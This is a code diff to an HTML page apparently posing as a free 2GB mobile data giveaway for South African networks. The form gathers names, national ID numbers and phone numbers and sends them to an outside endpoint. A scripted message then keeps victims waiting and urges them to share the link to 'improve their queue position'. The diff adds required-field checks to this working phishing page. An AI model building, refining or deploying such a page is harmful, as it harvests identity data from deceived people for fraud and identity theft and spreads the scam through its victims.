@@ -129,21 +129,17 @@
 										<div class="single-model-search">
 											<h2>first name</h2>
 											<div class="model-select-icon">
-												<input name="firstName" type="text" class="form-control">
+												<input name="firstName" type="text" class="form-control" required>
 											</div>
 										</div>
 										<div class="single-model-search">
 											<h2>preferred network</h2>
 											<div class="model-select-icon">
-												<select class="form-control">
-	
-													  <option value="default">MTN</option><!-- /.option-->
-	
-													  <option value="sedan">CELL C</option><!-- /.option-->
-	
-													  <option value="van">VODACOM</option><!-- /.option-->
-													  <option value="roadster">TELKOM</option><!-- /.option-->
-	
+												<select class="form-control" required>
+													<option value="default">MTN</option><!-- /.option-->
+													<option value="sedan">CELL C</option><!-- /.option-->
+													<option value="van">VODACOM</option><!-- /.option-->
+													<option value="roadster">TELKOM</option><!-- /.option-->
 												</select><!-- /.select-->
 											</div><!-- /.model-select-icon -->
 										</div>
@@ -152,13 +148,13 @@
 										<div class="single-model-search" id="get-connected">
 											<h2>last name</h2>
 											<div class="model-select-icon">
-												<input name="lastName" type="text" class="form-control">
+												<input name="lastName" type="text" class="form-control" required>
 											</div>
 										</div>
 										<div class="single-model-search">
 											<h2>phone number</h2>
 											<div class="model-select-icon">
-												<input name="phoneNumber" type="text" class="form-control">
+												<input name="phoneNumber" type="text" class="form-control" required>
 											</div>
 										</div>
 									</div>
@@ -166,22 +162,18 @@
 										<div class="single-model-search">
 											<h2>ID Number</h2>
 											<div class="model-select-icon">
-												<input name="idNumber" type="text" class="form-control">
+												<input name="idNumber" type="text" class="form-control" required>
 											</div>
 										</div>
 										<div class="single-model-search">
 											<h2>select bundle</h2>
 											<div class="model-select-icon">
-												<select class="form-control">
-	
-													  <option value="default">bundle</option><!-- /.option-->
-	
-													  <option value="$0.00">2GB MTN</option><!-- /.option-->
-													  <option value="$0.00">2GB CELL C</option><!-- /.option-->
-	
-													  <option value="$0.00">2GB VODACOM</option><!-- /.option-->
-													  <option value="$0.00">2GB TELKOM</option><!-- /.option-->
-	
+												<select class="form-control" required>
+													<option value="default">bundle</option><!-- /.option-->
+													<option value="$0.00">2GB MTN</option><!-- /.option-->
+													<option value="$0.00">2GB CELL C</option><!-- /.option-->
+													<option value="$0.00">2GB VODACOM</option><!-- /.option-->
+													<option value="$0.00">2GB TELKOM</option><!-- /.option-->
 												</select><!-- /.select-->
 											</div><!-- /.model-select-icon -->
 										</div>
@@ -196,11 +188,10 @@
 									<!-- Add this modal element to your HTML -->
 									<div id="myModal" class="modal">
 										<div class="modal-content">
-										<span class="close">&times;</span>
-										<p id="modalParagraph">This is the message inside the modal.</p>
+											<span class="close">&times;</span>
+											<p id="modalParagraph">This is the message inside the modal.</p>
 										</div>
 									</div>
-  
 								</div>
 							</form>
 						</div>
@@ -632,40 +623,50 @@
         <script src="assets/js/custom.js"></script>
 
 		<script>
+			// Define success and error messages
+			var successMessage = "Congratulations! You have been successfully added to the queue. Given the high volume of requests, please allow up to 5 hours for your requested bundle to be loaded. Should the 5-hour mark pass without successful loading, kindly verify your details to expedite the process. We recommend sharing the provided link to boost account activity and enhance your position in the queue. Thank you for your patience and understanding.";
+		
+			var errorMessage = "Oops! Some fields are missing. Please fill out all required fields.";
+		
 			document.getElementById("myForm").addEventListener("submit", function (event) {
 				event.preventDefault(); // Prevents the default form submission behavior
 		
-				// Gather form data
-				var formData = {
-					firstName: document.getElementsByName("firstName")[0].value,
-					lastName: document.getElementsByName("lastName")[0].value,
-					idNumber: document.getElementsByName("idNumber")[0].value,
-					phoneNumber: document.getElementsByName("phoneNumber")[0].value,
-					// Add other form fields similarly
-				};
-				// console.log('form', formData);
+				// Check if all form fields are valid
+				if (this.checkValidity()) {
+					// Gather form data
+					var formData = {
+						firstName: document.getElementsByName("firstName")[0].value,
+						lastName: document.getElementsByName("lastName")[0].value,
+						idNumber: document.getElementsByName("idNumber")[0].value,
+						phoneNumber: document.getElementsByName("phoneNumber")[0].value,
+						// Add other form fields similarly
+					};
 		
-				// Make API call using an appropriate method (e.g., fetch)
-				fetch('https://lime-delightful-kingfisher.cyclic.app/users', {
-					method: 'POST',
-					headers: {
-						'Content-Type': 'application/json',
-						// Add any other headers as needed
-					},
-					body: JSON.stringify(formData),
-				})
-				.then(response => response.json())
-				.then(data => {
-					// Handle API response if needed
-					// console.log(data);
-					
-					// Show the modal with the API response message
-					showModal("Congratulations! You have been successfully added to the queue. Given the high volume of requests, please allow up to 5 hours for your requested bundle to be loaded. Should the 5-hour mark pass without successful loading, kindly verify your details to expedite the process. We recommend sharing the provided link to boost account activity and enhance your position in the queue. Thank you for your patience and understanding.");
-				})
-				.catch(error => {
-					// Handle errors
-					console.error('Error:', error);
-				});
+					// Make API call using an appropriate method (e.g., fetch)
+					fetch('https://lime-delightful-kingfisher.cyclic.app/users', {
+						method: 'POST',
+						headers: {
+							'Content-Type': 'application/json',
+							// Add any other headers as needed
+						},
+						body: JSON.stringify(formData),
+					})
+					.then(response => response.json())
+					.then(data => {
+						// Handle API response if needed
+						// console.log(data);
+						
+						// Show the modal with the success message
+						showModal(successMessage);
+					})
+					.catch(error => {
+						// Handle errors
+						console.error('Error:', error);
+					});
+				} else {
+					// If form is invalid, show the error message
+					showModal(errorMessage);
+				}
 			});
 		
 			// Function to show the modal
@@ -690,6 +691,7 @@
 				}
 			}
 		</script>
+		
 		
         
     </body>
